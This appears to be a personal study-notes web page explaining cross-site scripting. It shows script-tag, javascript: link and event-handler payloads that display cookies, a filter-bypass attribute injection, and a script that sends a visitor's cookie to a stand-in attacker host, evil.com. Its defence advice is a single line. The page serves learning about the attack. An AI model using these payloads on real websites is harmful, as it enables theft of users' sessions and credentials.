<?php $iainPageTitle = 'XSS'; $docDepth = 2;?>
<?php include '../../partials/head.php'; ?>

<?php $breadcrumbAddress = (ltrim($homePath,'"')) . 'partials/breadcrumbs.php'; ?>
<?php include $breadcrumbAddress; ?>

<p>
	Posting a message on a website with embedded javascript that, when opened by another user, will access their cookie data (username/password...) and do something with it.  Usually sending it to a site owned by the XSS author.
</p>

<h3>How to do XSS?</h3>

<p>
<ul>
	<li>
		Need the ability to send a message to other users on the site.
	</li>
	<li>
		Ususally focused on cookies that store username and password.
	</li>
	<li>
		This code will display a users cookie: <code>alert(document.cookie);</code> <a href="javascript:alert(document.cookie);">Check it out!</a>
	</li>
</ul>
So, if the site just copies the text from one user to another, this could be written:
<pre><code>&lt;script&gt;
alert(document.cookie);
&lt;/script&gt;</pre></code>

Or, if the &lt;script&gt; tags are being filtered:

<pre><code>&lt;a href="javascript:alert(document.cookie);"&gt;Click me&lt;/a&gt;

&lt;a href="advanced.html" onClick="alert(document.cookie)"&gt;test&lt;/a&gt;</code></pre>

Note: <code>onClick</code> requires the user to click, an alternative would be <a onMouseOver="alert(document.cookie);"><code>onMouseOver</code></a>.<br />
<br />
With that, if you are looking to aquire the cookie, redirect the user to a site you own and insert the cookie into the url:
<pre><code>&lt;script&gt;
document.location = 'http://evil.com/blah.cgi?cookie=' + document.cookie;
&lt;/script&gt;</pre></code>

Finally, if a site allows users to submit clickable links into text but doesn't filter spaces or quotation marks, this might be given as a URL:
<pre><code>http://foocome" onMouseOver="alert(document.cookie)</code></pre>
Which would result in:
<pre><code>&lt;a href="<strong>http://foocome" onMouseOver="alert(document.cookie)</strong>"&gt;http://foocome&lt;/a&gt;</code></pre>
</p>
<h3>Protecting against XSS?</h3>
<p>Good flitering</p>

<hr>
Sources:
<ul>
	<li>
		A good run through: <a href="http://www.steve.org.uk/Security/XSS/Tutorial/index.html">Steve's tutorial</a>
	</li>
</ul>

<?php $footerAddress = (ltrim($homePath,'"')) . 'partials/footer.php'; ?>
<?php include $footerAddress; ?>